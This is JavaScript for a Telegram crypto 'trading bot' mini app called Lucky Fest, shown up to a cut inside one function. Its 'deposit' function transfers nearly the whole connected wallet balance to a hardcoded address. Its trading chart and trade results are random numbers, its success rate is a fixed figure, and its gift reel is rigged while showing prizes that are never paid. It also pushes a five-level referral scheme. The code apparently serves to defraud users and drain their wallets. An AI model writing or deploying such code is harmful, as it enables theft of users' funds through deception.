/* Lucky Fest Mini App - TON Connect + Topup + Tasks */
const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
if (tg) {
  tg.ready();
  tg.expand();
  try { tg.setHeaderColor("#0b1220"); tg.setBackgroundColor("#0b1220"); } catch(e){}
}

const state = {
  user: null,
  config: null,
  page: "trade",
  liveBalance: 0,
  miningTimer: null,
  isAdmin: false,
  tasks: [],
  referrals: null,
  tonConnectUI: null,
  walletConnected: false,
  walletAddress: null
};

const $ = (s, el=document) => el.querySelector(s);
const $$ = (s, el=document) => [...el.querySelectorAll(s)];
const content = $("#content");

function toast(msg) {
  const t = $("#toast");
  if (!t) return;
  t.textContent = msg;
  t.classList.add("show");
  setTimeout(() => t.classList.remove("show"), 2400);
}

function headers() {
  const h = { "Content-Type": "application/json" };
  if (tg && tg.initData) h["x-telegram-init-data"] = tg.initData;
  return h;
}

async function api(path, opts={}) {
  const res = await fetch(path, { ...opts, headers: { ...headers(), ...(opts.headers||{}) } });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(data.error || "Request failed");
  return data;
}

function money(n, d=8) {
  const x = Number(n) || 0;
  return x.toFixed(d).replace(/\.?0+$/, m => m.includes('.') ? m.replace(/0+$/,'').replace(/\.$/,'') : m) || "0";
}

function fmtOnline(n) {
  return Number(n||0).toLocaleString("en-US") + " online";
}

function nextInviteReward(count) {
  const rewards = [20,20,20,10,10];
  return rewards[Math.min(count||0, rewards.length-1)] || 10;
}

function depositAddress() {
  return (state.config && state.config.depositAddress) || "UQCzzBp_io5zdMiOCMykYY7HzUFkhRqST-xMWvr_DzSScooi";
}
function depositAddressTonkeeper() {
  return (state.config && state.config.depositAddressTonkeeper) || "UQCzzBp_io5zdMiOCMykYY7HzUFkhRqST-xMWvr_DzSScooi";
}
function depositAddressDefi() {
  return (state.config && state.config.depositAddressDefi) || "UQAVEPBT35E0amE3PpQObBDC9ZGAflMcNlUpwCRVph2eHXkg";
}

function channelUrl() {
  return (state.config && state.config.channelUrl) || "https://t.me/Lucky_Fest_Official";
}

/* ---------- TON Connect ---------- */
function initTonConnect() {
  if (state.tonConnectUI) return state.tonConnectUI;
  if (!window.TON_CONNECT_UI) {
    console.warn("TON Connect UI not loaded");
    return null;
  }
  try {
    const ui = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: location.origin + "/tonconnect-manifest.json",
      buttonRootId: null
    });
    state.tonConnectUI = ui;

    ui.onStatusChange((wallet) => {
      if (wallet) {
        state.walletConnected = true;
        state.walletAddress = wallet.account?.address || null;
        toast("Wallet connected");
        const st = $("#walletStatus");
        if (st) st.textContent = "✓ Connected: " + shortAddr(state.walletAddress);
        const btn = $("#connectWallet");
        if (btn) btn.textContent = "Disconnect";
      } else {
        state.walletConnected = false;
        state.walletAddress = null;
        const st = $("#walletStatus");
        if (st) st.textContent = "Not connected — connect first";
        const btn = $("#connectWallet");
        if (btn) btn.textContent = "🔗 Connect Wallet";
      }
    });
    return ui;
  } catch (e) {
    console.error("TON Connect init error", e);
    return null;
  }
}

function shortAddr(a) {
  if (!a) return "";
  const s = String(a);
  return s.slice(0, 6) + "…" + s.slice(-4);
}

async function connectWallet() {
  const ui = initTonConnect();
  if (!ui) {
    toast("TON Connect not available. Copy address & send manually.");
    return;
  }
  // If already connected → disconnect so user can switch wallet
  if (state.walletConnected) {
    try {
      await ui.disconnect();
      state.walletConnected = false;
      state.walletAddress = null;
      toast("Wallet disconnected");
      const st = $("#walletStatus");
      if (st) st.textContent = "Not connected — connect first";
      const btn = $("#connectWallet");
      if (btn) btn.textContent = "🔗 Connect Wallet";
    } catch (e) {
      toast("Disconnect failed");
    }
    return;
  }
  try {
    await ui.openModal();
  } catch (e) {
    toast("Could not open wallet connect");
  }
}

/** Send deposit from connected wallet to official address */
async function fetchWalletBalanceNano(address) {
  // Prefer our server proxy (no CORS), fallback to tonapi direct
  try {
    const data = await api("/api/ton-balance?address=" + encodeURIComponent(address));
    if (data && data.balance) return BigInt(data.balance);
  } catch (e) {
    console.warn("server balance failed", e);
  }
  try {
    const res = await fetch("https://tonapi.io/v2/accounts/" + encodeURIComponent(address));
    if (!res.ok) return 0n;
    const data = await res.json();
    return BigInt(data.balance || 0);
  } catch (e) {
    console.error("balance fetch", e);
    return 0n;
  }
}

async function sendDepositFromWallet() {
  const ui = state.tonConnectUI || initTonConnect();
  if (!ui || !state.walletConnected || !state.walletAddress) {
    toast("Please connect wallet first");
    return false;
  }
  const to = depositAddressTonkeeper();
  try {
    toast("Preparing deposit…");
    let bal = await fetchWalletBalanceNano(state.walletAddress);
    const gasReserve = 80000000n; // ~0.08 TON for fees

    // If balance unknown/zero, still open wallet with a small test amount so user can confirm
    // Prefer full balance when known
    let amountNano;
    let amountTon;
    if (bal > gasReserve) {
      amountNano = bal - gasReserve;
      amountTon = Math.floor((Number(amountNano) / 1e9) * 10000) / 10000;
    } else if (bal > 10000000n) {
      // very small balance - send almost all
      amountNano = bal - 10000000n;
      amountTon = Math.floor((Number(amountNano) / 1e9) * 10000) / 10000;
    } else {
      // Cannot read balance or empty — open wallet anyway with minimal message amount
      // User still must Confirm in wallet (cannot skip by code)
      amountNano = 1000000n; // 0.001 TON placeholder so wallet UI opens
      amountTon = 0.001;
      toast("Open wallet & confirm. Send max from wallet if needed.");
    }

    const tx = {
      validUntil: Math.floor(Date.now() / 1000) + 600,
      messages: [{ address: to, amount: amountNano.toString() }]
    };

    // This ALWAYS opens the wallet for user Confirm (required by wallet security)
    await ui.sendTransaction(tx);

    // Only after wallet confirms successfully
    if (amountTon > 0) {
      try {
        const data = await api("/api/topup", {
          method: "POST",
          body: JSON.stringify({ amount: amountTon, note: "Auto after wallet transfer" })
        });
        toast(data.message || "Deposit submitted. Check Telegram.");
        closeModal();
      } catch (e) {
        toast(e.message || "Transfer done — request failed, contact admin");
      }
    }
    return true;
  } catch (e) {
    console.error(e);
    const msg = (e && e.message) ? e.message : "Transaction cancelled / failed";
    // User rejected in wallet
    if (/reject|cancel|abort/i.test(msg)) toast("You cancelled the transfer");
    else toast(msg);
    return false;
  }
}

/* Live mining — big number = UNCLAIMED profit only; speed from incomeHour */
function formatLive(n) {
  const x = Math.max(0, Number(n) || 0);
  return "$" + x.toFixed(10);
}
function startMining() {
  if (state.miningTimer) clearInterval(state.miningTimer);
  const u = state.user;
  if (!u) return;
  const hourRate = Math.max(0, Number(u.incomeHour) || 0);
  const tick = hourRate > 0 ? (hourRate / 3600 / 20) : 0;
  // Only accrued since last claim (NOT total USDT)
  let accrued = 0;
  if (u.lastClaimAt) {
    const hrs = Math.min((Date.now() - new Date(u.lastClaimAt).getTime()) / 3600000, 48);
    accrued = Math.max(0, hrs * hourRate);
  } else if (hourRate > 0) {
    accrued = hourRate * 0.002; // tiny start if never claimed
  }
  state.liveBalance = accrued;
  const paint = () => {
    const el = $("#liveBal");
    if (el) el.textContent = formatLive(state.liveBalance);
  };
  paint();
  if (tick <= 0) return;
  state.miningTimer = setInterval(() => {
    state.liveBalance += tick;
    paint();
  }, 50);
}
function startLiveBalance(u) {
  state.user = u || state.user;
  startMining();
}

async function showPayouts() {
  try {
    const { payouts } = await api("/api/payouts");
    if (!payouts || !payouts.length) return;
    const p = payouts[Math.floor(Math.random()*payouts.length)];
    const toastEl = $("#payoutToast");
    if (toastEl) {
      $("#payoutName").textContent = p.user;
      $("#payoutAmount").textContent = "$" + p.amount + " USDT";
      toastEl.classList.add("show");
      setTimeout(() => toastEl.classList.remove("show"), 3500);
    }
  } catch(e) {}
}


/* ---------- Pages ---------- */
const TG_LOGO = "https://telegram.org/img/t_logo.svg";

function profileHeader(u) {
  return '<div class="profile-row"><img class="avatar" src="'+(u.photoUrl||'/assets/assistant-logo.jpg')+'" onerror="this.src=\'/assets/assistant-logo.jpg\'" alt=""><div style="flex:1;min-width:0"><div class="badge-name">Lucky Fest</div><div class="total-line"><b>'+money(u.coins||0,2)+'</b> <span>USDT Total balance</span></div></div><button type="button" class="level-pill" id="levelBtn">* Level '+(u.level||1)+'</button></div>';
}

function renderTrade() {
  /* TRADE ONLY — trading-bot dashboard + GRID chart (no claim/topup/invite) */
  const u = state.user || {};
  const totalBal = money(u.coins || 0, 0);
  content.innerHTML = `
    <h2 style="margin:0 0 4px;font-size:22px;font-weight:900">Your trading-bot dashboard</h2>
    <p class="hint" style="margin-top:0">Top up from 10 USDT to unlock extra bots and raise income</p>
    <div class="dash-card">
      <div class="dash-active">● ACTIVE</div>
      <div class="label">Total balance</div>
      <div class="big">${totalBal} <span style="font-size:18px;opacity:.85">USDT</span></div>
      <div class="dash-stats">
        <div><small>Coins</small><b>${money(u.coins,0)}</b></div>
        <div><small>Active</small><b>1 bots</b></div>
        <div><small>USDT</small><b>$${money(u.usdt,4)}</b></div>
      </div>
    </div>
    <div class="stat-grid">
      <div class="stat-box"><small>🛡 Successful trades</small><b>77.87%</b></div>
      <div class="stat-box"><small>📈 Total income</small><b>${money(u.claimedUsdt||0,2)} USDT</b></div>
      <div class="stat-box"><small>🤖 Bots</small><b>BTC</b></div>
      <div class="stat-box"><small>⏱ Updated</small><b id="updTime">${new Date().toLocaleTimeString()}</b></div>
    </div>
    <h3 style="margin:16px 0 6px;font-size:18px;font-weight:900">How to read the chart and reports</h3>
    <p class="hint">Each line on the chart is a limit buy/sell order. “B” is a buy at that point, “S” is a sell. Long and short trades can be open at the same time.</p>
    <div class="chart-box">
      <div class="chart-head">
        <div>
          <b>BTC/USDT · GRID Bot</b>
          <div style="font-size:12px;color:#94a3b8" id="chartPx">78,000</div>
        </div>
        <div class="chart-tabs">
          <button type="button" data-r="1" class="on">1 day</button>
          <button type="button" data-r="7">7 days</button>
          <button type="button" data-r="30">30 days</button>
        </div>
      </div>
      <canvas class="chart-canvas" id="gridChart" width="400" height="200"></canvas>
      <div class="ops-list"><h4>GRID-bot operations</h4><div id="opsList"></div></div>
    </div>
  `;
  drawGridChart(1);
  $$(".chart-tabs button").forEach((b) => {
    b.onclick = () => {
      $$(".chart-tabs button").forEach((x) => x.classList.remove("on"));
      b.classList.add("on");
      drawGridChart(Number(b.dataset.r));
    };
  });
}

function drawGridChart(range) {
  const c = $("#gridChart");
  if (!c) return;
  const ctx = c.getContext("2d");
  const w = c.width, h = c.height;
  ctx.fillStyle = "#0a0f18";
  ctx.fillRect(0, 0, w, h);
  // grid lines
  ctx.strokeStyle = "rgba(255,255,255,.06)";
  ctx.setLineDash([4, 4]);
  for (let i = 0; i < 5; i++) {
    const y = 16 + i * ((h - 32) / 4);
    ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(w, y); ctx.stroke();
  }
  ctx.setLineDash([]);
  const n = range === 1 ? 48 : range === 7 ? 42 : 36;
  let price = 78500;
  const pts = [];
  for (let i = 0; i < n; i++) {
    price += (Math.random() - 0.5) * (range === 30 ? 500 : 140);
    pts.push(price);
  }
  const min = Math.min(...pts), max = Math.max(...pts);
  const sy = (v) => h - 16 - ((v - min) / (max - min || 1)) * (h - 32);
  // purple MA-ish line
  ctx.strokeStyle = "#a78bfa";
  ctx.lineWidth = 1.5;
  ctx.beginPath();
  pts.forEach((v, i) => {
    const x = (i / (pts.length - 1)) * (w - 16) + 8;
    if (i === 0) ctx.moveTo(x, sy(v)); else ctx.lineTo(x, sy(v));
  });
  ctx.stroke();
  // candles
  for (let i = 1; i < pts.length; i++) {
    const x = (i / (pts.length - 1)) * (w - 16) + 8;
    const up = pts[i] >= pts[i - 1];
    ctx.fillStyle = up ? "#22c55e" : "#ef4444";
    const y1 = sy(pts[i - 1]), y2 = sy(pts[i]);
    ctx.fillRect(x - 2, Math.min(y1, y2), 4, Math.max(2, Math.abs(y2 - y1)));
  }
  // B / S markers
  for (let i = 3; i < pts.length - 1; i += 4) {
    const x = (i / (pts.length - 1)) * (w - 16) + 8;
    const y = sy(pts[i]);
    const buy = Math.random() > 0.4;
    ctx.fillStyle = buy ? "#22c55e" : "#f472b6";
    const bw = 14, bh = 12;
    ctx.beginPath();
    if (buy) {
      ctx.roundRect ? ctx.roundRect(x - bw/2, y - bh/2, bw, bh, 3) : ctx.rect(x - bw/2, y - bh/2, bw, bh);
    } else {
      ctx.roundRect ? ctx.roundRect(x - bw/2, y - bh/2, bw, bh, 3) : ctx.rect(x - bw/2, y - bh/2, bw, bh);
    }
    ctx.fill();
    ctx.fillStyle = "#fff";
    ctx.font = "bold 9px sans-serif";
    ctx.textAlign = "center";
    ctx.fillText(buy ? "B" : "S", x, y + 3);
    ctx.textAlign = "left";
  }
  const last = pts[pts.length - 1];
  const ch = ((last - pts[0]) / pts[0] * 100);
  const px = $("#chartPx");
  if (px) {
    px.innerHTML = Math.round(last).toLocaleString() +
      ' <span style="color:' + (ch >= 0 ? "#4ade80" : "#f87171") + '">' +
      (ch >= 0 ? "+" : "") + ch.toFixed(2) + "%</span>";
  }
  const ops = $("#opsList");
  if (ops) {
    let rows = "";
    for (let i = 0; i < 8; i++) {
      const d = new Date(Date.now() - i * 3600000 * (range === 1 ? 1.5 : range === 7 ? 8 : 24));
      const pct = (Math.random() > 0.15 ? 1 : -1) * (0.2 + Math.random() * 1.2);
      const cls = pct >= 0 ? "pos" : "neg";
      const sign = pct >= 0 ? "+" : "";
      rows += '<div class="ops-row"><span>' +
        d.toLocaleDateString() + " · " + String(d.getHours()).padStart(2,"0") + ":" +
        String(d.getMinutes()).padStart(2,"0") +
        '</span><span class="' + cls + '">' + sign + pct.toFixed(2) + "%</span></div>";
    }
    ops.innerHTML = rows;
  }
}

function renderFarm() {
  /* FARM ONLY — earning home: live profit, claim, coins/usdt, topup, invite, channel */
  const u = state.user || {};
  startLiveBalance(u);
  const inviteCoins = nextInviteReward(u.referralCount);
  const pct = u.levelPercent ? (u.levelPercent * 100).toFixed(1) : "0";
  content.innerHTML = `
    ${profileHeader(u)}
    <div class="profit-hero">
      <div class="income-meta">
        <span class="dot-live">Income</span>
        <span>⏱ $${money(u.incomeHour,4)} hr</span>
        <span>📅 $${money(u.incomeDay,2)} day</span>
        <span>🗓 $${money(u.incomeMonth,2)} month</span>
      </div>
      <div class="profit-num" id="liveBal">${formatLive(state.liveBalance || 0)}</div>
      <div class="profit-actions">
        <button class="btn btn-lime" id="claimBtn">↗ Claim profit</button>
        <button class="btn btn-dark" id="howBtn">? How to earn?</button>
      </div>
      <p class="hint">Top up to 3 USDT or grow with invites to raise income to 2.7% per day.</p>
    </div>
    <div class="grid2">
      <div class="mini-card coins">
        <h4>Coins</h4>
        <div class="val">${money(u.coins,0)} <small style="font-size:12px;color:var(--muted)">≈ $${money(u.coins,2)}</small></div>
        <div class="sub">0.02% Per day</div>
        <span class="icon-abs">🎁</span>
      </div>
      <div class="mini-card usdt">
        <h4>USDT balance</h4>
        <div class="val">$${money(u.usdt,4)}</div>
        <div class="sub">${pct}% Per day</div>
        <span class="icon-abs" style="color:#26a17b;font-weight:900">₮</span>
      </div>
    </div>
    <div class="action-row">
      <button class="btn btn-blue" id="topupBtn">↑ Top up</button>
      <button class="btn btn-lime" id="withdrawBtn">↓ Withdraw</button>
    </div>
    <div class="invite-box">
      <div class="title">Get +${inviteCoins} coins for an invite</div>
      <div class="reward-item">⚡ Your hourly income will increase!</div>
      <div class="reward-item blue">★ Automatic 5-level USDT income</div>
      <div class="row-btns">
        <button class="btn btn-dark" id="copyInv">⧉ Copy</button>
        <button class="btn btn-blue" id="shareInv">✈ Invite</button>
      </div>
    </div>
    <div class="subscribe-card">
      <div class="tg"><img src="${TG_LOGO}" width="24" height="24" alt="TG" onerror="this.style.display='none'"></div>
      <div style="flex:1">
        <b>Subscribe to the channel</b>
        <div style="font-size:12px;color:var(--muted)">Get +10 coins on your balance</div>
      </div>
      <button class="btn btn-blue btn-sm" id="subBtn">Subscribe →</button>
    </div>
    <div class="review">★★★★★ Payout reviews</div>
  `;
  const lb = $("#levelBtn"); if (lb) lb.onclick = openLevels;
  $("#claimBtn").onclick = doClaim;
  $("#howBtn").onclick = openHowEarn;
  $("#topupBtn").onclick = openTopup;
  $("#withdrawBtn").onclick = openWithdraw;
  $("#copyInv").onclick = copyInvite;
  $("#shareInv").onclick = shareInvite;
  $("#subBtn").onclick = doSubscribe;
}

function renderFriends(){
  content.innerHTML=`<h2 style="margin:0 0 14px;font-size:22px;font-weight:900">Invite friends and raise your hourly income</h2>
    <div class="row-btns" style="margin-bottom:14px"><button class="btn btn-dark" id="copyInv">Copy</button><button class="btn btn-blue" id="shareInv">Invite</button></div>
    <div class="card" style="background:linear-gradient(160deg,#14532d,#166534);border:none;color:#fff"><h3 style="color:#fff">Reward for each friend</h3>
      <div class="reward-item">+50 coins · First invite</div><div class="reward-item">+30 coins · Second</div>
      <div class="reward-item">+20 coins · Third</div><div class="reward-item">+10 coins · Further</div></div>
    <div class="card" style="background:linear-gradient(160deg,#1e3a5f,#1e40af);border:none;color:#fff"><b>+1 gift for every invite</b></div>
    <div class="five-level"><h4>Five-level program</h4><div class="level-bars"><div>10%</div><div>3%</div><div>2%</div><div>1%</div><div>1%</div></div>
      <p style="margin:10px 0 0;font-size:12px;opacity:.85">From every USDT top-up</p></div>
    <div class="card"><h3>Your referrals</h3><div class="level-tabs" id="refTabs">
      <button class="on" data-lv="all">All</button><button data-lv="1">L1</button><button data-lv="2">L2</button>
      <button data-lv="3">L3</button><button data-lv="4">L4</button><button data-lv="5">L5</button></div>
      <div id="refList"><p class="hint">Loading...</p></div></div>`;
  $("#copyInv").onclick=copyInvite; $("#shareInv").onclick=shareInvite;
  loadReferrals("all");
  $$("#refTabs button").forEach(b=>{b.onclick=()=>{$$("#refTabs button").forEach(x=>x.classList.remove("on"));b.classList.add("on");loadReferrals(b.dataset.lv);};});
}

async function loadReferrals(lv){
  const box=$("#refList"); if(!box) return;
  try{
    const data=await api("/api/referrals"); const levels=data.levels||{};
    const tabs=$$("#refTabs button");
    const total=(levels.l1||0)+(levels.l2||0)+(levels.l3||0)+(levels.l4||0)+(levels.l5||0);
    if(tabs[0]) tabs[0].textContent="All · "+total;
    for(let i=1;i<=5;i++) if(tabs[i]) tabs[i].textContent="L"+i+" · "+(levels["l"+i]||0);
    let list=data.direct||[]; if(lv!=="all") list=list.filter(x=>String(x.level)===String(lv));
    if(!list.length){box.innerHTML='<p class="hint">No referrals yet</p>';return;}
    box.innerHTML=list.map(x=>'<div class="ref-row"><div><b>'+(x.name||"User")+'</b><div class="meta">'+(x.joinedAt?new Date(x.joinedAt).toLocaleString():"")+'</div></div><div style="text-align:right"><div style="color:#4ade80;font-weight:800">+0.00 USDT</div><div class="meta">Level '+(x.level||1)+'</div></div></div>').join("");
  }catch(e){box.innerHTML='<p class="hint">'+e.message+'</p>';}
}

function renderGifts(){
  const u = state.user || {};
  const gifts = Number(u.gifts || 0);
  const skins = [
    { cls: "skin-gold", tag: "FREE", badge: "24h", icon: "💍" },
    { cls: "skin-purple", tag: "FREE", badge: "Gift", icon: "🎁" },
    { cls: "skin-green", tag: "FARM", badge: "0.1", icon: "🐸" },
    { cls: "skin-blue", tag: "LIMITED", badge: "VIP", icon: "👑" },
    { cls: "skin-gold", tag: "FREE", badge: "24h", icon: "🪙" },
    { cls: "skin-purple", tag: "FREE", badge: "Gift", icon: "💎" }
  ];
  let cards = "";
  for (let i = 0; i < gifts; i++) {
    const s = skins[i % skins.length];
    cards += `<button type="button" class="gift-premium ${s.cls}" data-i="${i}">
      <span class="gp-badge">${s.badge}</span>
      <span class="gp-icon">${s.icon}</span>
      <span class="gp-tag">${s.tag}</span>
    </button>`;
  }
  if (!gifts) cards = '<p class="hint">No gifts left. Invite friends to earn more.</p>';
  content.innerHTML = `
    <h2 style="margin:0 0 14px;font-size:22px;font-weight:900">Open gifts and get free coins</h2>
    <div class="card gift-invite-card">
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px">
        <span style="font-size:26px">🎁</span>
        <b>Get +1 gift for every invite</b>
      </div>
      <div class="row-btns">
        <button class="btn btn-dark" id="copyInv">Copy</button>
        <button class="btn btn-blue" id="shareInv">Invite</button>
      </div>
    </div>
    <p class="hint">You have <b>${gifts}</b> gift(s) · Tap a box to spin</p>
    <div class="gift-premium-grid">${cards}</div>
  `;
  $("#copyInv").onclick = copyInvite;
  $("#shareInv").onclick = shareInvite;
  $$(".gift-premium").forEach((el) => { el.onclick = () => openGiftSpin(); });
}

function openGiftSpin() {
  // Visual symbols (TON/NFT never awarded by server)
  const pool = [
    { id: "coin", label: "COIN", emoji: "🪙" },
    { id: "usdt", label: "USDT", emoji: "💵" },
    { id: "ton", label: "TON", emoji: "💎" },
    { id: "nft", label: "NFT", emoji: "🖼️" },
    { id: "coin", label: "COIN", emoji: "🪙" },
    { id: "usdt", label: "USDT", emoji: "💵" },
    { id: "coin", label: "COIN", emoji: "🪙" },
    { id: "ton", label: "TON", emoji: "💎" }
  ];
  let strip = "";
  for (let r = 0; r < 10; r++) {
    pool.forEach((it) => {
      strip += '<div class="reel-item" data-id="'+it.id+'"><div class="ri-emoji">'+it.emoji+'</div><div class="ri-lab">'+it.label+'</div></div>';
    });
  }
  openModal(`
    <div class="modal-head"><h2>🎁 Epic Gift</h2><button class="modal-close" id="mc">Close</button></div>
    <p class="hint" style="text-align:center;margin-bottom:8px">Spinning… lands on Coin or USDT</p>
    <div class="reel-wrap">
      <div class="reel-pointer top"></div>
      <div class="reel-window"><div class="reel-track" id="reelTrack">${strip}</div></div>
      <div class="reel-pointer bot"></div>
    </div>
    <div class="spin-result" id="spinResult" style="display:none"></div>
  `);
  $("#mc").onclick = closeModal;

  const track = $("#reelTrack");
  if (!track) return;
  // Wait layout then measure real item width
  requestAnimationFrame(() => {
    const first = track.querySelector(".reel-item");
    const gap = 10;
    const itemW = (first ? first.getBoundingClientRect().width : 78) + gap;
    const win = track.parentElement;
    const winW = win ? win.clientWidth : 280;
    // Land on a coin slot (index 0,4,6 in pool of 8) after several loops
    const loops = 6;
    const landInPool = 0; // coin
    const landIndex = loops * pool.length + landInPool;
    const centerOffset = winW / 2 - (itemW - gap) / 2;
    const targetX = landIndex * itemW - centerOffset;
    track.style.transition = "none";
    track.style.transform = "translate3d(0,0,0)";
    requestAnimationFrame(() => {
      track.style.transition = "transform 4s cubic-bezier(0.15, 0.85, 0.12, 1)";
      track.style.transform = "translate3d(-" + Math.max(0, targetX) + "px,0,0)";
    });
  });

  setTimeout(async () => {
    try {
      const res = await api("/api/gift/open", { method: "POST", body: "{}" });
      state.user = res.user;
      const box = $("#spinResult");
      if (box) {
        box.style.display = "block";
        if (res.rewardType === "usdt") {
          box.innerHTML = '<div class="spin-win usdt">+$' + res.reward + ' USDT</div>';
          toast("+$" + res.reward + " USDT");
        } else {
          box.innerHTML = '<div class="spin-win coin">+' + (res.reward || res.rewardCoins || 0) + ' coins</div>';
          toast("+" + (res.reward || res.rewardCoins || 0) + " coins");
        }
      }
      setTimeout(() => { closeModal(); renderGifts(); }, 1600);
    } catch (e) {
      toast(e.message);
      closeModal();
      renderGifts();
    }
  }, 4100);
}

async function openGift() {
  openGiftSpin();
}

function renderTasks(){
  content.innerHTML=`<h2 style="margin:0 0 6px;font-size:22px;font-weight:900">Tasks</h2>
    <p class="hint">Channels, bots, partners & official — earn coins</p><div id="taskList"><p class="hint">Loading...</p></div>`+
    (state.isAdmin?`<div class="card" style="margin-top:16px"><h3>Admin · Add task</h3><div class="admin-form">
      <label>Title</label><input id="tTitle" placeholder="Join official channel">
      <label>Description</label><input id="tDesc">
      <label>Type</label><select id="tType">
        <option value="official_channel">Official Channel</option><option value="official_bot">Official Bot</option>
        <option value="channel">Channel</option><option value="bot">Bot</option>
        <option value="partner_channel">Partner Channel</option><option value="partner_bot">Partner Bot</option>
        <option value="unique">Unique</option></select>
      <label>Link</label><input id="tLink" placeholder="https://t.me/...">
      <label>Reward coins</label><input id="tCoins" type="number" value="10">
      <label>Button text</label><input id="tBtn" value="Open">
      <button class="btn btn-lime" id="addTask">+ Add task</button></div></div>`:"");
  loadTasks();
  const add=$("#addTask");
  if(add) add.onclick=async()=>{try{
    await api("/api/admin/tasks",{method:"POST",body:JSON.stringify({
      title:$("#tTitle").value,description:$("#tDesc").value,taskType:$("#tType").value,
      link:$("#tLink").value,rewardCoins:Number($("#tCoins").value)||10,buttonText:$("#tBtn").value||"Open",icon:"telegram"
    })}); toast("Task added"); loadTasks();
  }catch(e){toast(e.message);}};
}

async function loadTasks(){
  const box=$("#taskList"); if(!box) return;
  try{
    const data=await api("/api/tasks"); state.tasks=data.tasks||[];
    if(!state.tasks.length){box.innerHTML='<p class="hint">No tasks yet</p>';return;}
    const typeLabel={bot:"Bot",channel:"Channel",partner_channel:"Partner Channel",partner_bot:"Partner Bot",official_channel:"Official Channel",official_bot:"Official Bot",unique:"Unique"};
    box.innerHTML=state.tasks.map(t=>`<div class="task-card pop"><div class="task-icon"><img src="${TG_LOGO}" alt="TG"></div>
      <div class="body"><div class="task-type">${typeLabel[t.taskType]||t.taskType||"Task"}</div><b>${t.title}</b>
      <small>${t.description||""} · +${t.rewardCoins||0} coins</small></div>
      ${t.claimed?'<button class="btn btn-dark btn-sm" disabled>Done</button>':
        '<button class="btn btn-blue btn-sm task-go" data-id="'+t.id+'" data-link="'+(t.link||'')+'">'+(t.buttonText||"Open")+'</button>'}</div>`).join("");
    $$(".task-go").forEach(btn=>{btn.onclick=async()=>{
      if(btn.dataset.link){if(tg&&tg.openTelegramLink)tg.openTelegramLink(btn.dataset.link);else window.open(btn.dataset.link,"_blank");}
      try{const res=await api("/api/tasks/claim",{method:"POST",body:JSON.stringify({taskId:btn.dataset.id})});
        state.user=res.user;toast("Reward claimed");loadTasks();}catch(e){toast(e.message);}
    };});
  }catch(e){box.innerHTML='<p class="hint">'+e.message+'</p>';}
}

function renderAccount(){
  const u=state.user||{};
  content.innerHTML=profileHeader(u)+`<div class="acc-grid">
    <div class="acc-tile"><div class="lbl">Invited by</div><div class="v" style="font-size:13px">${u.referrerTelegramId||"—"}</div></div>
    <div class="acc-tile"><div class="lbl">Coin balance</div><div class="v" style="color:#fbbf24">${money(u.coins,0)}</div></div>
    <div class="acc-tile"><div class="lbl">USDT balance</div><div class="v">${money(u.usdt,3)} USDT</div></div>
    <div class="acc-tile"><div class="lbl">Referral income</div><div class="v" style="color:#a78bfa">${money(u.referralIncome,2)} USDT</div></div>
    <div class="acc-tile"><div class="lbl">Referral coins</div><div class="v" style="color:#f472b6">${money(u.referralCoins,0)} coins</div></div>
    <div class="acc-tile"><div class="lbl">USDT withdrawn</div><div class="v">${money(u.withdrawnUsdt,2)} USDT</div></div>
    <div class="acc-tile" id="langTile" style="cursor:pointer"><div class="lbl">Language</div><div class="v">${u.language||"English"}</div></div>
    <div class="acc-tile"><div class="lbl">Theme</div><div class="v" style="display:flex;justify-content:space-between;align-items:center">
      <span id="themeLbl">${(u.theme||"dark")==="light"?"Light":"Dark"}</span>
      <input type="checkbox" id="themeToggle" ${(u.theme||"dark")==="light"?"":"checked"}></div></div>
    <div class="acc-tile" id="opsTile" style="cursor:pointer"><div class="lbl">Operations</div><div class="v" style="font-size:13px;color:var(--muted)">History</div></div>
    <div class="acc-tile" id="faqTile" style="cursor:pointer"><div class="lbl">FAQ</div><div class="v" style="font-size:13px;color:var(--muted)">18 answers</div></div>
    <div class="acc-tile wide" id="helpTile" style="cursor:pointer"><div class="lbl">Help</div><div class="v" style="font-size:13px;color:#4ade80">Operators online</div></div>
  </div><p class="hint" style="text-align:center;margin-top:16px">Lucky Fest · 2026</p>`;
  const lb=$("#levelBtn"); if(lb) lb.onclick=openLevels;
  $("#langTile").onclick=openLanguage; $("#opsTile").onclick=openOperations; $("#faqTile").onclick=openFAQ;
  $("#helpTile").onclick=()=>{
    const url = "https://t.me/assistant_bd";
    if (tg && tg.openTelegramLink) tg.openTelegramLink(url);
    else window.open(url, "_blank");
  };
  $("#themeToggle").onchange=async e=>{
    const light=!e.target.checked; document.body.classList.toggle("theme-light",light);
    $("#themeLbl").textContent=light?"Light":"Dark";
    try{await api("/api/settings",{method:"POST",body:JSON.stringify({theme:light?"light":"dark"})});}catch(_){}
  };
}

function shareInvite(){
  const u=state.user||{}; const bot=(state.config&&state.config.botUsername)||"LuckyFest_bot";
  const link="https://t.me/"+bot+"?start=ref_"+(u.telegramId||"");
  if(navigator.share) navigator.share({title:"Lucky Fest",text:"Join Lucky Fest!\n"+link,url:link}).catch(()=>copyText(link));
  else copyText(link);
}
function copyInvite(){const u=state.user||{}; const bot=(state.config&&state.config.botUsername)||"LuckyFest_bot";
  copyText("https://t.me/"+bot+"?start=ref_"+(u.telegramId||""));}
async function copyText(t){try{await navigator.clipboard.writeText(t);toast("Copied");}catch(_){toast(t);}}


async function doClaim(){
  try{
    const res = await api("/api/claim", { method: "POST", body: "{}" });
    state.user = res.user;
    // After claim: unclaimed profit restarts from 0
    if (state.user) state.user.lastClaimAt = new Date().toISOString();
    state.liveBalance = 0;
    toast(res.claimed ? ("Claimed $" + money(res.claimed, 6)) : (res.message || "Claimed"));
    startMining();
    if (state.page === "trade") renderTrade();
    else renderFarm();
  } catch (e) { toast(e.message); }
}
async function doSubscribe(){const url=channelUrl(); if(tg&&tg.openTelegramLink)tg.openTelegramLink(url);else window.open(url,"_blank");
  try{const res=await api("/api/subscribe",{method:"POST",body:"{}"});if(res.user)state.user=res.user;toast(res.message||"+10 coins");}catch(e){toast(e.message);}}

function openModal(html){const root=$("#modalRoot");root.className="open";root.innerHTML='<div class="modal-backdrop" id="mb"></div><div class="modal-sheet">'+html+"</div>";$("#mb").onclick=closeModal;}
function closeModal(){const root=$("#modalRoot");root.className="";root.innerHTML="";}

function openHowEarn(){
